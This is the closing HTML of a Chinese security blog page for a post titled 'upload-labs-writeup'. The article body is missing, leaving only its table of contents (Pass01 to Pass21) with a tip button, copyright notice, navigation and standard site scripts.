  <div>穷困潦倒的安全工作者，如果文章对您有所帮助，可以选择性打赏。</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/WeChatQR.JPG" alt="lyxhh 微信支付"/>
        <p>微信支付</p>
      </div>
    

    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    lyxhh
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://www.lxhsec.com/2020/01/05/upload-labs-writeup/" title="upload-labs-writeup">http://www.lxhsec.com/2020/01/05/upload-labs-writeup/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/28/java/" rel="next" title="java">
                <i class="fa fa-chevron-left"></i> java
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/01/06/php/" rel="prev" title="php">
                php <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/1.jpg"
                alt="lyxhh" />
            
              <p class="site-author-name" itemprop="name">lyxhh</p>
              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass01"><span class="nav-number">1.</span> <span class="nav-text">Pass01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass02"><span class="nav-number">2.</span> <span class="nav-text">Pass02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass03"><span class="nav-number">3.</span> <span class="nav-text">Pass03</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass04"><span class="nav-number">4.</span> <span class="nav-text">Pass04</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass05"><span class="nav-number">5.</span> <span class="nav-text">Pass05</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass06"><span class="nav-number">6.</span> <span class="nav-text">Pass06</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass07"><span class="nav-number">7.</span> <span class="nav-text">Pass07</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass08"><span class="nav-number">8.</span> <span class="nav-text">Pass08</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass09"><span class="nav-number">9.</span> <span class="nav-text">Pass09</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass10"><span class="nav-number">10.</span> <span class="nav-text">Pass10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass11"><span class="nav-number">11.</span> <span class="nav-text">Pass11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass12"><span class="nav-number">12.</span> <span class="nav-text">Pass12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass13"><span class="nav-number">13.</span> <span class="nav-text">Pass13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass14"><span class="nav-number">14.</span> <span class="nav-text">Pass14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass15"><span class="nav-number">15.</span> <span class="nav-text">Pass15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass16"><span class="nav-number">16.</span> <span class="nav-text">Pass16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass17"><span class="nav-number">17.</span> <span class="nav-text">Pass17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass18"><span class="nav-number">18.</span> <span class="nav-text">Pass18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass19"><span class="nav-number">19.</span> <span class="nav-text">Pass19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass20"><span class="nav-number">20.</span> <span class="nav-text">Pass20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass21"><span class="nav-number">21.</span> <span class="nav-text">Pass21</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">22.</span> <span class="nav-text">Summary</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lyxhh</span>

  
</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  
    <script type="text/javascript">
      (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
      })(document, 'script');
    </script>
  












  





  

  

  
  

  

  

  

</body>
</html>
